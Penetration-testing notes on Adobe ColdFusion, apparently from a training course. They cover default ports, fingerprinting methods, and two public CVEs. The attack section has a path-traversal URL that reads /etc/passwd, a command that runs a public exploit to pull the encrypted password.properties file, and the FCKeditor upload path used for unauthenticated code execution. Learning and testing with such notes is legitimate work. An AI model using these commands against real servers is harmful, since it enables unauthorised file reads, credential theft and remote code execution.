# ColdFusion

ColdFusion is a programming language and a web application development platform based on Java.

### Discovery / Footprinting

Exposed ports by ColdFusion ⇒ can be changed during install

| Port Number | Protocol       | Description                                                                                                                                                            |
| ----------- | -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 80          | HTTP           | Used for non-secure HTTP communication between the web server and web browser.                                                                                         |
| 443         | HTTPS          | Used for secure HTTP communication between the web server and web browser. Encrypts the communication between the web server and web browser.                          |
| 1935        | RPC            | Used for client-server communication. Remote Procedure Call (RPC) protocol allows a program to request information from another program on a different network device. |
| 25          | SMTP           | Simple Mail Transfer Protocol (SMTP) is used for sending email messages.                                                                                               |
| 8500        | SSL            | Used for server communication via Secure Socket Layer (SSL).                                                                                                           |
| 5500        | Server Monitor | Used for remote administration of the ColdFusion server.                                                                                                               |

### Enumeration

<table data-header-hidden><thead><tr><th></th><th width="395"></th></tr></thead><tbody><tr><td><strong>Method</strong></td><td><strong>Description</strong></td></tr><tr><td><code>Port Scanning</code></td><td>ColdFusion typically uses port 80 for HTTP and port 443 for HTTPS by default. So, scanning for these ports may indicate the presence of a ColdFusion server. Nmap might be able to identify ColdFusion during a services scan specifically.</td></tr><tr><td><code>File Extensions</code></td><td>ColdFusion pages typically use ".cfm" or ".cfc" file extensions. If you find pages with these file extensions, it could be an indicator that the application is using ColdFusion.</td></tr><tr><td><code>HTTP Headers</code></td><td>Check the HTTP response headers of the web application. ColdFusion typically sets specific headers, such as "Server: ColdFusion" or "X-Powered-By: ColdFusion", that can help identify the technology being used.</td></tr><tr><td><code>Error Messages</code></td><td>If the application uses ColdFusion and there are errors, the error messages may contain references to ColdFusion-specific tags or functions.</td></tr><tr><td><code>Default Files</code></td><td>ColdFusion creates several default files during installation, such as "admin.cfm" or "CFIDE/administrator/index.cfm". Finding these files on the web server may indicate that the web application runs on ColdFusion.</td></tr></tbody></table>

### Attacking

#### File inclusion

`CVE-2010-2861` is the `Adobe ColdFusion - Directory Traversal` exploit discovered by `searchsploit`. It is a vulnerability in ColdFusion that allows attackers to conduct path traversal attacks.

* `CFIDE/administrator/settings/mappings.cfm`
* `logging/settings.cfm`
* `datasources/index.cfm`
* `j2eepackaging/editarchive.cfm`
* `CFIDE/administrator/enter.cfm`

These ColdFusion files are vulnerable to a directory traversal attack in `Adobe ColdFusion 9.0.1` and `earlier versions`. Remote attackers can exploit this vulnerability to read arbitrary files by manipulating the `locale parameter` in these specific ColdFusion files.

```shellscript
# Default path
http://www.example.com/CFIDE/administrator/settings/mappings.cfm?locale=en

# File inclusion
http://www.example.com/CFIDE/administrator/settings/mappings.cfm?locale=../../../../../etc/passwd

# Search for exploits
searchsploit adobe coldfusion

# Get the exploit
searchsploit -p 14641
cp /usr/share/exploitdb/exploits/multiple/remote/14641.py .

# Get the password.properties file => contains encrypted passwords
python2 14641.py 10.129.204.230 8500 "../../../../../../../../ColdFusion8/lib/password.properties"
```

#### Unauthenticated RCE

`CVE-2009-2265` vulnerability that affected Adobe ColdFusion versions `8.0.1` and earlier. This exploit allowed unauthenticated users to upload files and gain remote code execution on the target host. The vulnerability exists in the `FCKeditor` package, and is accessible on the following path

```shellscript
http://www.example.com/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=

# Get the exploit
searchsploit -p 50057
cp /usr/share/exploitdb/exploits/cfm/webapps/50057.py .
```
